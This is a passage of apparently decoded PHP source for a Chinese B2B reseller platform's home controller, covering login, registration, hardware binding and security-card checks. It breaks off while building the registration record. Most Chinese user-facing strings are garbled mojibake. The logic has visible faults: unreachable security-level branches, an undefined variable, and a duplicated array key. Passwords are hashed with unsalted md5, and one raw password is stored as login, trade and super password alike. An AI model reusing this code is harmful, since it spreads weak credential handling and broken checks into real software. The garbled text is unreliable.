<?php
/****************************************/
/*                                      */
/*  919�������� http://www.919dns.com   */
/*  919վ��վ http://www.919zzz.com     */
/*  919�Ա��� http://919net.taobao.com  */
/*                                      */
/****************************************/

if ( !defined( "UPATH_ROOT" ) )
{
				exit( "hacking deny" );
}
class HomeController extends Controller
{

				public function __construct( )
				{
								$this->session = factory::getinstance( "session" );
								if ( ucfirst( request( "a" ) ) != "Web" && ucfirst( request( "a" ) ) != "D" )
								{
												$this->B2BInit( );
								}
				}

				public function Web( )
				{
								$R5b92e56774 = 1;
								$R8938de56a6 = 0;
								$R30b2ab8dc1 = $this->GetWebCache( );
								$Rcc5c6e696c = explode( "|", $R30b2ab8dc1['webopen'] );
								$R8938de56a6 = $Rcc5c6e696c[$R5b92e56774];
								if ( $Rcc5c6e696c[$R5b92e56774] == 1 && 0 < $masterid )
								{
												$Rcc5c6e696c = explode( "|", $R30b2ab8dc1['webopen'] );
												$R8938de56a6 = $Rcc5c6e696c[$R5b92e56774];
								}
								echo $R8938de56a6;
				}

				public function Close( )
				{
								include_once( UPATH_HELPER."ArticleHelper.php" );
								$R30b2ab8dc1 = $this->GetWebCache( );
								$R0f8134fb60 = "b2bcloseinfo";
								$R2d66faee5c = $R30b2ab8dc1;
							
												$this->Assign( "closeinfo", $R2d66faee5c[$R0f8134fb60] );
												$this->View( );
							
				}

				public function Home( )
				{
								$this->GetLoginInfo( );
								$this->SetArticle( 2 );
								$this->SetAd( 101, 200 );
								$this->Assign( "agent", $this->session->agent );
								$this->SetSec( );
							
												$this->View( );
							
				}

				public function SetSec( )
				{
								$Rcc5c6e696c = $this->session->agent;
								$R2a51483b14 = $Rcc5c6e696c[7];
								$R94e0136c8a = isset( $Rcc5c6e696c[9] ) ? $Rcc5c6e696c[9] : 0;
								$R1ed7ad9990 = ACACHE."sec_".$R2a51483b14."_".$R94e0136c8a.".php";
								if ( file_exists( $R1ed7ad9990 ) )
								{
												include( $R1ed7ad9990 );
												$R679e9b9234 = $R39ad040863;
								}
								else
								{
												$this->Assign( "lv", 1 );
												return;
								}
								$R1855197459 = "";
								$Rb025988d11 = 0;
								if ( isset( $R679e9b9234['id'] ) )
								{
												if ( $R679e9b9234['ipcheck'] )
												{
																$Rb025988d11 += 1;
												}
												if ( $R679e9b9234['maccheck'] )
												{
																$Rb025988d11 += 2;
												}
												if ( $R679e9b9234['hdecheck'] )
												{
																$Rb025988d11 += 3;
												}
												if ( $R679e9b9234['cpucheck'] )
												{
																$Rb025988d11 += 4;
												}
												if ( $R679e9b9234['mibaokacheck'] )
												{
																$Rb025988d11 += 5;
												}
												if ( $R679e9b9234['mobilecheck'] )
												{
																$Rb025988d11 += 6;
												}
								}
								else
								{
												$Rb025988d11 = 0;
								}
								if ( $Rb025988d11 == 0 )
								{
												$R1855197459 = 1;
								}
								else if ( $Rb025988d11 == 1 )
								{
												$R1855197459 = 2;
								}
								else if ( $Rb025988d11 == 2 )
								{
												$R1855197459 = 2;
								}
								else if ( $Rb025988d11 == 3 )
								{
												$R1855197459 = 3;
								}
								else if ( 3 < $Rb025988d11 )
								{
												$R1855197459 = 3;
								}
								else if ( 5 < $Rb025988d11 )
								{
												$R1855197459 = 4;
								}
								else if ( 11 < $Rb025988d11 )
								{
												$R1855197459 = 4;
								}
								else if ( 17 < $Rb025988d11 )
								{
												$R1855197459 = 5;
								}
								$this->Assign( "lv", $R1855197459 );
				}

				public function SetConfig( )
				{
								$R30b2ab8dc1 = $this->GetWebCache( );
								$Rcc5c6e696c = explode( "|", $R30b2ab8dc1['config'] );
								$R30aa8c1852 = count( $Rcc5c6e696c );
								if ( 0 < $R30aa8c1852 && $Rcc5c6e696c[0] == 1 && $R30b2ab8dc1['popcontent'] != "" )
								{
												$R0f8134fb60 = $R30b2ab8dc1['popcontent'];
												$R0f8134fb60 = preg_replace( "/\r\n/", "\\n", $R0f8134fb60 );
												$this->Alert( $R0f8134fb60 );
								}
								if ( 2 < $R30aa8c1852 && $Rcc5c6e696c[2] == 1 )
								{
												$R675fc348c9 = $this->session->agent;
												$R98bc1630cd = $R675fc348c9[6];
												if ( $R98bc1630cd < $R30b2ab8dc1['alertremain'] )
												{
																$this->Alert( "�������� ".$R30b2ab8dc1['alertremain']." �뼰ʱ����������" );
												}
								}
								if ( 1 < $R30aa8c1852 && $Rcc5c6e696c[1] == 1 )
								{
												$R9e0664486a = factory::getinstance( "msg" );
												$Rcc5c6e696c = $this->session->agent;
												list( , , , , $R5334b17ba8, , , $R2a51483b14 ) = $Rcc5c6e696c;
												$data = array(
																"msgtype" => 1,
																"msgto" => $R2a51483b14,
																"bossid" => $R5334b17ba8
												);
												$num = $R9e0664486a->IMsg_NotReaded( $data );
												if ( 0 < $num )
												{
																$this->LoginMsgGo( );
												}
								}
				}

				public function GetLoginInfo( )
				{
								$Rcc5c6e696c = $this->session->agent;
								if ( $Rcc5c6e696c == "" )
								{
												$this->Alert( "ϵͳ�Ѿ��˳��������µ�½��" );
												$this->GoHome( "b2b" );
								}
								$R2a51483b14 = $Rcc5c6e696c[7];
								$R679e9b9234 = $this->GetAgentCache( $R2a51483b14 );
								$this->Assign( "logininfo", $R679e9b9234 );
				}

				public function Index( $R9906335164 = false, $R511aa10c02 = "index.html" )
				{
								$this->SetArticle( 1 );
								$this->SetAd( 100, 200 );
								$this->SetBank( );
								$this->SetPoll( );
								$this->Assign( "css", "ub-red-20080119" );								
								$this->view( null, null, $R9906335164, $R511aa10c02 );								
				}

				public function SetBank( )
				{
								$R222ff303f4 = factory::getinstance( "banks" );
								$this->Assign( "banks", $R222ff303f4->IBank_Get( array( "remit" => 1 ) ) );
				}

				public function Reg( )
				{
								if ( $this->session->agent != "" )
								{
												$this->Alert( "���ã�����δ�˳�ϵͳ��ϵͳ���Զ��˳�������ע��ҳ�棡" );
												$this->session->agentlogout( );
												$this->ScriptRedirect( "index.php?m=mod_b2b&a=Reg" );
								}
							
												$this->Assign( "css", "ub-red-20080119" );
												$this->View( );							
				}

				public function Login( )
				{
								$Rb7da52a305 = "";
								if ( isset( $_SESSION['randcode'] ) )
								{
												$Rb7da52a305 = $_SESSION['randcode'];
								}
								$Rd19ae93b31 = getvar( "verifycode", "", "POST" );
								if ( $Rd19ae93b31 == "" || $Rb7da52a305 != $Rd19ae93b31 )
								{
												$this->Alert( "��֤�����" );
												$this->GoHome( "b2b" );
												exit( );
								}
								$R5d899a20a5 = getvar( "aname" );
								$R0dc0347d49 = getvar( "staffname", "" );
								$Re934deb52d = getvar( "pwd" );
								$R00bb5d9597 = md5( $Re934deb52d );
								$Rdb9dec9d1c = 1;
								$Rad3482f4ca = getvar( "mac" );
								$R03a88a8ff8 = getvar( "cpu" );
								$R9665b7d660 = getvar( "hde" );
								$R9cfb7c6d6b = $this->GetIp( );
								$Re5584ed794 = array(
												"isbindhard" => $Rdb9dec9d1c,
												"mac" => $Rad3482f4ca,
												"cpu" => $R03a88a8ff8,
												"hde" => $R9665b7d660,
												"ip" => $R9cfb7c6d6b,
												"randcode" => $Rb7da52a305
								);
								if ( $R5d899a20a5 != "" && $Re934deb52d != "" && $R0dc0347d49 == "" )
								{
												$this->AgentLogin( $R5d899a20a5, $R00bb5d9597, $Re5584ed794 );
								}
								else if ( $R5d899a20a5 == "" && $Re934deb52d != "" && $R0dc0347d49 != "" )
								{
												$this->StaffLogin( $R0dc0347d49, $R00bb5d9597, $Re5584ed794 );
								}
								$this->Alert( "��������\\n\\n1.�����µ���ϰ��¼����Ա����¼ѡ��\\n2.Ȼ���������¼�ʺ�" );
								$this->HistoryGo( );
				}

				public function AgentLogin( $R5d899a20a5, $R00bb5d9597, $Re5584ed794 )
				{
								$R2097a8fddf = factory::getinstance( "agents" );
								$R4e420efcc3 = $R2097a8fddf->IAgent_Login( $R5d899a20a5, $R00bb5d9597, 0, $Re5584ed794 );
								if ( $R4e420efcc3 == 0 )
								{
												$this->AddLogin( 0, 0, $R5d899a20a5, 0, 1, "�û��������ڣ���½ʧ��", 0 );
												$this->Alert( "�̼Ҳ����ڣ���ȷ���Ƿ����������ߵ�½����ѡ�����" );
												$this->HistoryGo( );
								}
								else if ( $R4e420efcc3 == 2 )
								{
												$this->AddLogin( 0, 0, $R5d899a20a5, 0, 1, "�ͻ�δ��ͨ����½ʧ��", 0 );
												$this->Alert( "�����ʻ�ϵͳ��û�п�ͨ�����Ѿ������ᣡ����ϵ�����ϼ�������" );
												$this->HistoryGo( );
								}
								else if ( $R4e420efcc3 == 1 )
								{
												$this->AddLogin( 0, 0, $R5d899a20a5, 0, 1, "������󣬵�½ʧ��", 0 );
												$this->Alert( "������������" );
												$this->HistoryGo( );
								}
								else if ( $R4e420efcc3 == 7 )
								{
												$this->Alert( "����û�����ð��κ�Ӳ������ʹ�ò���Ӳ����½��" );
												$this->HistoryGo( );
								}
								else
								{
												if ( $R4e420efcc3 == 3 || $R4e420efcc3 == 4 || $R4e420efcc3 == 5 || $R4e420efcc3 == 6 )
												{
																$this->AddLogin( 0, 0, $R5d899a20a5, 0, 1, "������Ӳ���󶨣��Ǳ�����½����½ʧ��", 0 );
																$this->Alert( "������Ӳ���󶨵�¼����ȷ�ϵ�½ʱ���Ƿ�ѡ��Ӳ����\\n����Ѿ���ѡ�����ҵ������ð󶨵ĵ��Ե�¼���ɣ�" );
																$this->HistoryGo( );
												}
												else
												{
																if ( !isset( $R4e420efcc3[0]['aid'] ) )
																{
																				$this->AddLogin( 0, 0, $R5d899a20a5, 0, 1, "�쳣���󣬵�½ʧ��", 0 );
																				$this->Alert( "�쳣����" );
																				$this->HistoryGo( );
																}
																$R3db8f5c8bc = $R4e420efcc3[0];
																$this->IsFrozenTime( $R3db8f5c8bc );
																if ( $this->CheckMiBaoKa( $R3db8f5c8bc['aid'], 0 ) == 0 )
																{
																				$this->AddLogin( 0, 0, $R5d899a20a5, 0, 1, "�ܱ�������󣬵�½ʧ��", 0 );
																				$this->Alert( "�ܱ������������������" );
																				$this->HistoryGo( );
																}
																if ( $this->VerifyMobile( $R3db8f5c8bc['aid'], 0 ) == 0 )
																{
																				$this->AddLogin( 0, 0, $R5d899a20a5, 0, 1, "����������󣬵�½ʧ��", 0 );
																				$this->Alert( "���������������������" );
																				$this->GoHome( "b2b" );
																}
																$R046b4585a2 = $this->GetRank( $R3db8f5c8bc['alv'] );
																if ( !isset( $R046b4585a2['name'] ) )
																{
																				$this->AddLogin( 0, 0, $R5d899a20a5, 0, 1, "�ͻ����������⣬������ϵͳ���������⣬��½ʧ��", 0 );
																				$this->Alert( "���ļ��������⣬��Ϳͷ���ϵ��" );
																				$this->HistoryGo( );
																}
																if ( $R046b4585a2['gid'] == 0 )
																{
																				$this->AddLogin( 0, 0, $R5d899a20a5, 0, 1, "��Ա�û��޷���½������ϵͳ����½ʧ��", 0 );
																				$this->Alert( "��Ա�û��޷���½������ϵͳ��" );
																				$this->HistoryGo( );
																}
																if ( 0 < $R3db8f5c8bc['parentid'] )
																{
																				$R9aa102385f = $this->GetAgentCache( $R3db8f5c8bc['parentid'] );
																				if ( !isset( $R9aa102385f['frozen'] ) )
																				{
																								$this->AddLogin( 0, 0, $R5d899a20a5, 0, 1, "�ϼҲ����ڣ���½ʧ��", 0 );
																								$this->Alert( "�����ϼ��Ѿ������ڣ�����ϵƽ̨�ͷ���ѯ��" );
																								$this->HistoryGo( );
																				}
																				else if ( $R9aa102385f['frozen'] == 1 )
																				{
																								$this->AddLogin( 0, 0, $R5d899a20a5, 0, 1, "�ϼұ����ᣬ��½ʧ��", 0 );
																								$this->Alert( "�����ϼ��Ѿ������ᣬ����ϵ�����ϼң�" );
																								$this->HistoryGo( );
																				}
																				$R4906cf6137 = $this->GetRank( $R9aa102385f['alv'] );
																				if ( !isset( $R4906cf6137['name'] ) )
																				{
																								$this->AddLogin( 0, 0, $R5d899a20a5, 0, 1, "�ϼҼ��������⣬��½ʧ��", 0 );
																								$this->Alert( "�����ϼҼ��������⣬����ϵ�����ϼң�" );
																								$this->HistoryGo( );
																				}
																				$R4420266e85 = $this->GetRankType( );
																				if ( $R4420266e85 )
																				{
																								if ( $R4906cf6137['gid'] <= $R046b4585a2['gid'] )
																								{
																												$this->AddLogin( 0, 0, $R5d899a20a5, 0, 1, "�ϼһ򱻽�������½ʧ��", 0 );
																												$this->Alert( "�����ϼһ򱻽������������ļ���������⣬�޷���½������ϵ�����ϼң�" );
																												$this->HistoryGo( );
																								}
																				}
																				else if ( $R4906cf6137['money'] <= $R046b4585a2['money'] )
																				{
																								$this->AddLogin( 0, 0, $R5d899a20a5, 0, 1, "�ϼһ򱻽�������½ʧ��", 0 );
																								$this->Alert( "�����ϼһ򱻽������������ļ���������⣬�޷���½������ϵ�����ϼң�" );
																								$this->HistoryGo( );
																				}
																}
																setcookie( "umebiz_com_gid", "", time( ) - 3600 );
																setcookie( "umebiz_com_gid", $R046b4585a2['gid'], time( ) + 86400 );
																$this->SetWebCookie( $R3db8f5c8bc['aid'], 1 );
																$R6009e84434 = $R046b4585a2['name'];
																$data = $R3db8f5c8bc['aname']."|".$R3db8f5c8bc['company']."|".$R6009e84434."|".$R3db8f5c8bc['prv'].$R3db8f5c8bc['city']."|".$R3db8f5c8bc['parentid']."|".$R3db8f5c8bc['alv']."|".$R3db8f5c8bc['aremain']."|".$R3db8f5c8bc['aid']."|".$R00bb5d9597."|0|0|".$R3db8f5c8bc['leftrights'];
																$this->AddLogin( $R3db8f5c8bc['aid'], 0, $R3db8f5c8bc['aname'], 0, 1, "�ɹ���½", 1 );
																$this->session->set( "agentinfo", $data );
																$this->SetConfig( );
																$this->LoginGo( );
												}
								}
				}

				public function CheckMiBaoKa( $R2a51483b14, $R94e0136c8a )
				{
								$R679e9b9234 = $this->GetSecCache( $R2a51483b14, $R94e0136c8a );
								if ( isset( $R679e9b9234['mibaokacheck'] ) && $R679e9b9234['mibaokacheck'] == 1 )
								{
												if ( isset( $_SESSION['mibaorandcode'] ) )
												{
																$R60125139d3 = $_SESSION['mibaorandcode'];
																$Rcc5c6e696c = explode( " ", $R60125139d3 );
																$Rd919497634 = factory::getinstance( "mibaoka" );
																$R3db8f5c8bc = $Rd919497634->IMiBaoKa_GetBySn( $R679e9b9234['mibaoka'] );
																if ( isset( $R3db8f5c8bc['xy'] ) )
																{
																				$R16182d95f4 = unserialize( $R3db8f5c8bc['xy'] );
																				$R63bede6b19 = "";
																				foreach ( $Rcc5c6e696c as $R0f8134fb60 )
																				{
																								$R63bede6b19 .= $R16182d95f4[$R0f8134fb60];
																				}
																				$R2b9fd8dfe3 = getvar( "mibaocode" );
																				if ( $R63bede6b19 != $R2b9fd8dfe3 )
																				{
																								return 0;
																				}
																				else
																				{
																								return 1;
																				}
																}
																else
																{
																				$this->Alert( "�����ܱ����Ѿ�������Աɾ��������ϵ����Ա" );
																				$this->HistoryGo( );
																}
												}
												else
												{
																return 0;
												}
								}
								else
								{
												return 1;
								}
				}

				public function SetWebCookie( $R2a51483b14, $R70e13706d8 = 0, $R94e0136c8a = 0 )
				{
								$R3db8f5c8bc = $this->GetAgentCache( $R2a51483b14 );
								$R8eeb1221ae = explode( "|", $R3db8f5c8bc['websetting'] );
								$Rf5f11a8d38 = count( $R8eeb1221ae );
								if ( $R70e13706d8 == 1 && isset( $R8eeb1221ae[5] ) && $R8eeb1221ae[5] == 0 )
								{
												$this->Alert( "���ã����Ѿ����ò�����ͨ����ҳ��ʽ��¼��" );
												$this->HistoryGo( );
								}
								
								for ( $Ra16d228039 = 0;	$Ra16d228039 < $Rf5f11a8d38;	$Ra16d228039++	)
								{
												setcookie( "umebiz_com_".$Ra16d228039, "", time( ) - 3600 );
												setcookie( "umebiz_com_".$Ra16d228039, $R8eeb1221ae[$Ra16d228039], time( ) + 86400 );
								}
								if ( 0 < $R94e0136c8a )
								{
												setcookie( "umebiz_com_staff", "", time( ) - 3600 );
												setcookie( "umebiz_com_staff", 1, time( ) + 86400 );
												$Raac42e4217 = $this->GetStaffCache( $R94e0136c8a );
												if ( !isset( $Raac42e4217['checktradepwd'] ) )
												{
																$this->Alert( "�Ƿ���½" );
																$this->HistoryGo( );
												}
												else
												{
																setcookie( "umebiz_com_8", "", time( ) - 3600 );
																setcookie( "umebiz_com_8", $Raac42e4217['checktradepwd'], time( ) + 86400 );
																$R61ccd04e96 = $Raac42e4217['ini'];
																$R8eeb1221ae = explode( "|", $R61ccd04e96 );
																$Rf5f11a8d38 = count( $R8eeb1221ae );
																
																for ( $Ra16d228039 = 0;	$Ra16d228039 < $Rf5f11a8d38;	$Ra16d228039++	)
																{
																				setcookie( "umebiz_com_ini_".$Ra16d228039, "", time( ) - 3600 );
																				setcookie( "umebiz_com_ini_".$Ra16d228039, $R8eeb1221ae[$Ra16d228039], time( ) + 86400 );
																}
												}
								}
								else
								{
												setcookie( "umebiz_com_staff", "", time( ) - 3600 );
												setcookie( "umebiz_com_staff", 0, time( ) + 86400 );
								}
				}

				public function StaffHistoryGo( )
				{
								$this->ScriptRedirect( UPATH_WEBROOT."b2b/" );
				}

				public function StaffLogin( $R0dc0347d49, $Rc509b4f207, $Re5584ed794 )
				{
								$R2097a8fddf = factory::getinstance( "staffs" );
								$R4e420efcc3 = $R2097a8fddf->IStaff_Login( $R0dc0347d49, $Rc509b4f207, 0, $Re5584ed794 );
								if ( $R4e420efcc3 == 0 )
								{
												$this->AddLogin( 0, 1, $R0dc0347d49, 0, 1, "Ա���˺Ų����ڣ���½ʧ��", 0 );
												$this->Alert( "Ա�������ڣ���ȷ���Ƿ����������ߵ�½����ѡ�����" );
												$this->StaffHistoryGo( );
								}
								else if ( $R4e420efcc3 == 2 )
								{
												$this->AddLogin( 0, 1, $R0dc0347d49, 0, 1, "�˺ű����ᣬ��½ʧ��", 0 );
												$this->Alert( "�ϰ廹û�п�ͨ����Ա���ʺţ����������ϰ��Ѿ������ᣡ����ϵ�����ϰ�" );
												$this->StaffHistoryGo( );
								}
								else if ( $R4e420efcc3 == 1 )
								{
												$this->AddLogin( 0, 1, $R0dc0347d49, 0, 1, "�����������󣬵�½ʧ��", 0 );
												$this->Alert( "������������" );
												$this->StaffHistoryGo( );
								}
								else if ( $R4e420efcc3 == 7 )
								{
												$this->Alert( "����û�����ð��κ�Ӳ������ʹ�ò���Ӳ����½��" );
												$this->StaffHistoryGo( );
								}
								else
								{
												if ( $R4e420efcc3 == 3 || $R4e420efcc3 == 4 || $R4e420efcc3 == 5 || $R4e420efcc3 == 6 )
												{
																$this->AddLogin( 0, 1, $R0dc0347d49, 0, 1, "������Ӳ���󶨣��Ǳ�����½����½ʧ��", 0 );
																$this->Alert( "������Ӳ���󶨵�¼����ȷ�ϵ�½ʱ���Ƿ�ѡ��Ӳ����\\n����Ѿ���ѡ�����ҵ������ð󶨵ĵ��Ե�¼���ɣ�" );
																$this->StaffHistoryGo( );
												}
												else
												{
																if ( !isset( $R4e420efcc3['agent']['aid'] ) || !isset( $R4e420efcc3['staff']['staffid'] ) )
																{
																				$this->AddLogin( 0, 1, $R0dc0347d49, 0, 1, "�쳣���󣬵�½ʧ��", 0 );
																				$this->Alert( "�쳣����" );
																				$this->StaffHistoryGo( );
																}
																$R3db8f5c8bc = $R4e420efcc3['agent'];
																$this->IsFrozenTime( $R3db8f5c8bc );
																$Raac42e4217 = $R4e420efcc3['staff'];
																if ( $this->CheckMiBaoKa( $R3db8f5c8bc['aid'], $Raac42e4217['staffid'] ) == 0 )
																{
																				$this->AddLogin( 0, 1, $R0dc0347d49, 0, 1, "�ܱ�������󣬵�½ʧ��", 0 );
																				$this->Alert( "�ܱ������������������" );
																				$this->StaffHistoryGo( );
																}
																if ( $this->VerifyMobile( $R3db8f5c8bc['aid'], $Raac42e4217['staffid'] ) == 0 )
																{
																				$this->AddLogin( 0, 1, $R0dc0347d49, 0, 1, "����������󣬵�½ʧ��", 0 );
																				$this->Alert( "���������������������" );
																				$this->GoHome( "b2b" );
																}
																$R2097a8fddf = factory::getinstance( "agents" );
																$R046b4585a2 = $R2097a8fddf->IAgent_GetRankById( $R3db8f5c8bc['alv'] );
																if ( !isset( $R046b4585a2['name'] ) )
																{
																				$this->AddLogin( 0, 1, $R0dc0347d49, 0, 1, "�ͻ����������⣬������ϵͳ���������⣬��½ʧ��", 0 );
																				$this->Alert( "���ļ��������⣬��Ϳͷ���ϵ��" );
																				$this->HistoryGo( );
																}
																if ( $R046b4585a2['gid'] == 0 )
																{
																				$this->AddLogin( 0, 1, $R0dc0347d49, 0, 1, "��Ա�û��޷���½������ϵͳ����½ʧ��", 0 );
																				$this->Alert( "��Ա�û��޷���½������ϵͳ��" );
																				$this->HistoryGo( );
																}
																setcookie( "umebiz_com_gid", "", time( ) - 3600 );
																setcookie( "umebiz_com_gid", $R046b4585a2['gid'], time( ) + 86400 );
																if ( 0 < $R3db8f5c8bc['parentid'] )
																{
																				$R9aa102385f = $this->GetAgentCache( $R3db8f5c8bc['parentid'] );
																				if ( !isset( $R9aa102385f['frozen'] ) )
																				{
																								$this->AddLogin( 0, 1, $R0dc0347d49, 0, 1, "�ϼҲ����ڣ���½ʧ��", 0 );
																								$this->Alert( "�����ϼ��Ѿ������ڣ�����ϵƽ̨�ͷ���ѯ��" );
																								$this->HistoryGo( );
																				}
																				else if ( $R9aa102385f['frozen'] == 1 )
																				{
																								$this->AddLogin( 0, 1, $R0dc0347d49, 0, 1, "�ϼұ����ᣬ��½ʧ��", 0 );
																								$this->Alert( "�����ϼ��Ѿ������ᣬ����ϵ�����ϼң�" );
																								$this->HistoryGo( );
																				}
																				$R4906cf6137 = $this->GetRank( $R9aa102385f['alv'] );
																				if ( !isset( $R4906cf6137['name'] ) )
																				{
																								$this->AddLogin( 0, 1, $R0dc0347d49, 0, 1, "�ϼҼ��������⣬��½ʧ��", 0 );
																								$this->Alert( "�����ϼҼ��������⣬����ϵ�����ϼң�" );
																								$this->HistoryGo( );
																				}
																				$R4420266e85 = $this->GetRankType( );
																				if ( $R4420266e85 )
																				{
																								if ( $R4906cf6137['gid'] <= $R046b4585a2['gid'] )
																								{
																												$this->AddLogin( 0, 1, $R0dc0347d49, 0, 1, "�ϼһ򱻽�������½ʧ��", 0 );
																												$this->Alert( "�����ϼһ򱻽������������ļ���������⣬�޷���½������ϵ�����ϼң�" );
																												$this->HistoryGo( );
																								}
																				}
																				else if ( $R4906cf6137['money'] <= $R046b4585a2['money'] )
																				{
																								$this->AddLogin( 0, 1, $R0dc0347d49, 0, 1, "�ϼһ򱻽�������½ʧ��", 0 );
																								$this->Alert( "�����ϼһ򱻽������������ļ���������⣬�޷���½������ϵ�����ϼң�" );
																								$this->HistoryGo( );
																				}
																}
																$this->SetWebCookie( $R3db8f5c8bc['aid'], 1, $Raac42e4217['staffid'] );
																$R6009e84434 = $R046b4585a2['name'];
																$R0a2fcddd4b = $R3db8f5c8bc['leftrights'];
																$R1929afdbab = $Raac42e4217['rights'];
																$R1d2e625383 = explode( ",", $R0a2fcddd4b );
																$R3cfdf8e16a = explode( ",", $R1929afdbab );
																$R026f0167b4 = array( );
																$Ra16d228039 = 0;
																foreach ( $R3cfdf8e16a as $R0f8134fb60 )
																{
																				$R026f0167b4[] = isset( $R1d2e625383[$Ra16d228039] ) && intval( $R1d2e625383[$Ra16d228039] ) == 1 ? $R0f8134fb60 : 0;
																				$Ra16d228039++;
																}
																$Ra0c8454e75 = implode( ",", $R026f0167b4 );
																$user = $R3db8f5c8bc['aname']."|".$R3db8f5c8bc['company']."|".$R6009e84434."|".$R3db8f5c8bc['prv'].$R3db8f5c8bc['city']."|".$R3db8f5c8bc['parentid']."|".$R3db8f5c8bc['alv']."|".$R3db8f5c8bc['aremain']."|".$R3db8f5c8bc['aid']."|".$Rc509b4f207."|".$Raac42e4217['staffid']."|".$Raac42e4217['staffname']."|".$Ra0c8454e75;
																$this->AddLogin( $R3db8f5c8bc['aid'], $Raac42e4217['staffid'], $Raac42e4217['staffname'], 0, 1, "�ɹ���½", 1 );
																$this->session->set( "agentinfo", $user );
																$R7130865f2e = $_SERVER['HTTP_REFERER'];
																$this->SetConfig( );
																$this->LoginGo( );
												}
								}
				}

				public function Logout( )
				{
								$this->session->agentlogout( );
								$this->GoHome( "b2b" );
				}

				public function D( )
				{
								$this->session->agentlogout( );
				}

				public function CheckUser( )
				{
								$R2097a8fddf = factory::getinstance( "agents" );
								echo $R2097a8fddf->IAgent_IsExist( getvar( "ubzaname" ) );
				}

				public function CheckAgentById( )
				{
								$R2a51483b14 = intval( request( "ubzaid" ) );
								if ( $R2a51483b14 == 0 )
								{
												echo 1;
												exit( );
								}
								$R381017b23a = $this->GetAgentCache( $R2a51483b14 );
								if ( !isset( $R381017b23a['aid'] ) )
								{
												echo 0;
												exit( );
								}
								if ( isset( $R381017b23a['alv'] ) )
								{
												$R87aee22884 = $this->GetRank( $R381017b23a['alv'] );
												if ( $R87aee22884['gid'] < 2 )
												{
																echo 0;
																exit( );
												}
								}
								echo 1;
				}

				public function Save( )
				{
								$R2097a8fddf = factory::getinstance( "agents" );
								$R0e49cc133a = $this->GetRankDefault( 1 );
								if ( !isset( $R0e49cc133a['id'] ) )
								{
												echo 2;
												exit( );
								}
								$R07cdd73907 = getvar( "ubzcname", "", "POST" );
								if ( trim( $R07cdd73907 ) == "" )
								{
												echo 0;
												exit( );
								}
								if ( strpos( $R07cdd73907, "|" ) !== false )
								{
												echo 0;
												exit( );
								}
								$R3ff93324b3 = getvar( "ubzcrealname", "", "POST" );
								$Rfddc2155d8 = getvar( "ubzcaddr", "", "POST" );
								$R6ae960df43 = getvar( "ubzcompany", "", "POST" );
								$R72f6fd380c = getvar( "ubzprv", "", "POST" );
								$Rcd67889baf = getvar( "ubzcity", "", "POST" );
								$R7cf2762c01 = getvar( "ubzeshop", "", "POST" );
								$R49904173b4 = getvar( "ubzidcard", "", "POST" );
								$R07cdd73907 = iconv( "UTF-8", "utf-8//IGNORE", $R07cdd73907 );
								$R3ff93324b3 = iconv( "UTF-8", "utf-8//IGNORE", $R3ff93324b3 );
								$Rfddc2155d8 = iconv( "UTF-8", "utf-8//IGNORE", $Rfddc2155d8 );
								$R6ae960df43 = iconv( "UTF-8", "utf-8//IGNORE", $R6ae960df43 );
								$R72f6fd380c = iconv( "UTF-8", "utf-8//IGNORE", $R72f6fd380c );
								$Rcd67889baf = iconv( "UTF-8", "utf-8//IGNORE", $Rcd67889baf );
								$R7cf2762c01 = iconv( "UTF-8", "utf-8//IGNORE", $R7cf2762c01 );
								$R6ae960df43 = str_replace( "|", "", $R6ae960df43 );
								$R72f6fd380c = str_replace( "|", "", $R72f6fd380c );
								$Rcd67889baf = str_replace( "|", "", $Rcd67889baf );
								$R4ecc66c386 = $R2097a8fddf->IAgent_IsExist( $R07cdd73907 );
								if ( $R4ecc66c386 == 0 )
								{
												echo 0;
												exit( );
								}
								global $masterid;
								$R0d6b33394f = getvar( "ubzcpwd", "", "POST" );
								$R289ea98f26 = getvar( "ubzcqq", "", "POST" );
								$R8b01c83d35 = getvar( "ubzcmail", "", "POST" );
								$Rb4f95547a5 = getvar( "ubzcmobile", "", "POST" );
								$R64dad0e3a8 = getvar( "ubzctel", "", "POST" );
								$R14b8c5658f = intval( request( "ubzparentid", "", "POST" ) );
								$Rf1f86e2396 = getvar( "ubzwebsetting", "", "POST" );
								if ( trim( $R0d6b33394f ) == "" )
								{
												echo 0;
												exit( );
								}
								if ( 0 < $masterid && $R14b8c5658f == 0 )
								{
												$R14b8c5658f = $masterid;
								}
								if ( 0 < $R14b8c5658f )
								{
												$R1ed7ad9990 = ACACHE."aid_".$R14b8c5658f.".php";
												if ( !file_exists( $R1ed7ad9990 ) )
												{
																echo 3;
																exit( );
												}
												else
												{
																include( $R1ed7ad9990 );
																$R381017b23a = $agent;
																$R87aee22884 = $this->GetRank( $R381017b23a['alv'], "gid" );
																if ( $R87aee22884['gid'] < 2 )
																{
																				echo 4;
																				exit( );
																}
																if ( $R87aee22884['gid'] <= $R0e49cc133a['gid'] )
																{
																				$Rab95a9b478 = $this->GetIdBelow( $R381017b23a['alv'] );
																				if ( $Rab95a9b478 == -1 )
																				{
																								echo 4;
																								exit( );
																				}
																				else
																				{
																								$R0e49cc133a['id'] = $Rab95a9b478;
																				}
																}
												}
								}
								$R30b2ab8dc1 = $this->GetMainWebCache( );
								$Rcc5c6e696c = explode( "|", $R30b2ab8dc1['config'] );
								$R30aa8c1852 = count( $Rcc5c6e696c );
								if ( 4 < $R30aa8c1852 )
								{
												$R581012b834 = $Rcc5c6e696c[4];
								}
								else
								{
												$R581012b834 = 0;
								}
								if ( $R581012b834 == 1 )
								{
												$Ra0c8454e75 = "1,0";
								}
								else
								{
												$Ra0c8454e75 = "0,0";
								}
								$R89cd0a3912 = 0;
								if ( UB_YKT || UB_B2B || UB_B2C || 39 < $R30aa8c1852 )
								{
												$R89cd0a3912 = $Rcc5c6e696c[39] == 0 ? 1 : 0;
								}
								$data = array(
												"aname" => trim( $R07cdd73907 ),
												"apwd" => trim( $R0d6b33394f ),
												"tradepwd" => trim( $R0d6b33394f ),
												"superpwd" => trim( $R0d6b33394f ),
												"arealname" => $R3ff93324b3,
												"aqq" => $R289ea98f26,
												"amail" => $R8b01c83d35,
												"atel" => $R64dad0e3a8,
												"aaddr" => $Rfddc2155d8,
												"company" => $R6ae960df43,
												"eshop" => $R7cf2762c01,
												"idcard" => $R49904173b4,
												"prv" => $R72f6fd380c,
												"city" => $Rcd67889baf,
												"websetting" => $Rf1f86e2396,
												"parentid" => $R14b8c5658f,
												"aqq" => getvar( "ubzcqq", "", "POST" ),
												"regdate" => date( "Y-m-d H-i-s" ),
												"regip" => $this->GetIp( ),
												"lastdate" => date( "Y-m-d H-i-s" ),
												"lastip" => $this->GetIp( ),
												"lastlogintype" => 0,
